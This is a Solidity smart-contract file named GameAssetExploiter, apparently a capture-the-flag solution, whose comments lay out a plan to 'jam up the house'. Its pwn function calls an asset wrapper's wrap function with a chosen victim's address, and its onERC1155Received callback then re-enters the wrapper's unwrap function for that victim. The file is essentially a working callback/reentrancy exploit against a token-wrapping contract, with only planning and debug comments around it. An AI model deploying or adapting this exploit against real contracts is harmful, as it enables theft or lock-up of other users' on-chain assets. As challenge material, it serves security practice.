// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";

import "hardhat/console.sol";
// pull interface from contract


// okay so heres the plan.
// use spoofed onERC721Received function to jam up the house. 

// make interface for asset wrapper, need wrap function. 

interface IAssetWrapper {
    function wrap(
      uint256 nftId,
      address assetOwner, //@audit - Can this be spoofed?
      address assetAddress
    ) external;
    function unwrap(
        address assetOwner,
        address assetAddress
    ) external;
}



contract GameAssetExploiter is ERC1155Receiver {

    // address swordAddress;
    // address shieldAddress;
    address wrapperAddress;
    address pwner;

    IAssetWrapper wrapper;
    // IAssetWrapper shield;

    // uint256 swordId;
    // uint256 shieldId;

    address victim;



    constructor(address _wrapper){

      wrapperAddress = _wrapper;
      // swordAddress = _sword;
      // shieldAddress = _shield;
      wrapper = IAssetWrapper(wrapperAddress);
      // shield = IAssetWrapper(shieldAddress);
      // swordId = _swordId;
      // shieldId = _shieldId;
      pwner = msg.sender;


      // pwn();

    }

// need to do this one at a time. 
    function pwn(address _victim, uint256 _id) external {
      // call wrapper on this, it should initiate the callback. lets try
      // console.log(msg.sender);
      // console.log(address(wrapper));
      victim = _victim;
      wrapper.wrap(_id, address(this), victim);
      // wrapper.wrap(shieldId, wrapperAddress, shieldAddress);


    }

    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data) external override returns(bytes4) {

      // bullshit magic in here
      require(msg.sender == address(wrapper), "invalid callback");

      // console.log(_operator);
      // console.log(_from);
      // console.log(_id);
      // console.log(_value);
      wrapper.unwrap(address(this), victim);

      return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    function onERC1155BatchReceived(address _operator, address _from, uint256[] calldata _ids, uint256[] calldata _values, bytes calldata _data) external override returns (bytes4) {
      // here we can see what we got
      // wrapper.wrap(swordId, address(this), swordAddress);
      // wrapper.wrap(shieldId, address(this), shieldAddress);
      // console.log(_operator);
      // console.log(_from);
      // console.log(_id);
      // console.log(_value);
      // return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
      return bytes4(0);
      // return bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"));
      // return bytes4(IERC721Receiver.onERC721Received.selector);
    }
}